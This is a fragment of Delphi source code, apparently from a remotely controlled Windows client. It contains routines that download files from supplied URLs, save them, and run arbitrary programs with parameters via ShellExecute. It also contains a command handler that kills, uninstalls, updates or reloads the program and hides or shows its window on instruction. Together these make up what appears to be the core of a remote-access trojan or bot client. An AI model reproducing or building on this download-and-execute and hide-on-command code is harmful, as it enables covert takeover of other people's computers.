procedure TForm1.downloadWWWfile(arrayData: Array of String);
var
  Stream: TMemoryStream;
begin
  try
    Stream:= TMemoryStream.Create;
    IdHTTP1.Get(arrayData[0],Stream);
    Stream.SaveToFile(arrayData[1]);
    Stream.Free;
  except
  on e:Exception do
    Stream.Free;
  end;
end;

function TForm1.downloadWWW(url: String): String;
var
  Stream: TMemoryStream;
  data: String;
begin
  try
    Stream:= TMemoryStream.Create;
    IdHTTP1.Get(url,Stream);
    SetString(data, PChar(Stream.Memory), Stream.Size);
    Result:= data;
    Stream.Free;
  except
  on e:Exception do
    Stream.Free;
  end;
end;

procedure TForm1.sendPOST(url: String; data: TStringList);
var
  html: WideString;
  //postData: TStringList;
begin
  try
    //data:= TStringList.Create;
    //ShowMessage(data.Strings[0]);
    //postData.Clear;
    //postData:= data;
    html:= IdHTTP1.Post(url, data);
    //data.Free;
  except
    on e:Exception do begin
      data.Free;
      //ShowMessage(e.ClassName +' -> |:| -> '+ e.Message);
    end;
  end;
end;

procedure TForm1.mainExecute(arrayData: Array of String);
begin
  ShellExecute(
    Form1.Handle,
    'open',
    PChar(arrayData[0]),
    PChar(arrayData[1]),
    nil,
    SW_SHOWNORMAL
  );
  if(arrayData[0] <> 'erased')
    and (arrayData[0] <> 'accept')
    and (arrayData[0] <> '') then
  if(StrToInt(arrayData[2]) = 0) then begin
    sleep(1000);
    //ShowMessage('OK! 0 = 0');
    h_pid:= GetPIDByProgramName(arrayData[0]);
    EnumWindows(@GetHWND, Form1.Handle);
  end;
  //ShowMessage('CMD: '+ arrayData[0] + sLineBreak + 'PARAMS: '+ arrayData[1] + sLineBreak +'DISPLAY: '+ arrayData[2]);
end;

procedure TForm1.service(data: String);
begin
  if(data = 'KILL') then
    ShellExecute(
      Form1.Handle,
      'open',
      'kill.cmd',
      nil,
      nil,
      SW_SHOWNORMAL
    );
  if(data = 'UNINSTALL') then
    ShellExecute(
      Form1.Handle,
      'open',
      'uninstall.cmd',
      nil,
      nil,
      SW_SHOWNORMAL
    );
  if(data = 'RELOAD') then
    ShellExecute(
      Form1.Handle,
      'open',
      'reload.cmd',
      nil,
      nil,
      SW_SHOWNORMAL
    );
  if(data = 'UPDATE') then
    ShellExecute(
      Form1.Handle,
      'open',
      'update.cmd',
      nil,
      nil,
      SW_SHOWNORMAL
    );
  if(data = 'SHOW') then begin
    ShowWindow(Form1.Handle, SW_SHOW);
    Form1.Show;
  end;
  if(data = 'HIDE') then begin
    ShowWindow(Form1.Handle, SW_HIDE);
    Form1.Hide;
  end;
  if(data = 'DEBUG') then
    ShowWindow(Form1.Handle, SW_SHOW);
end;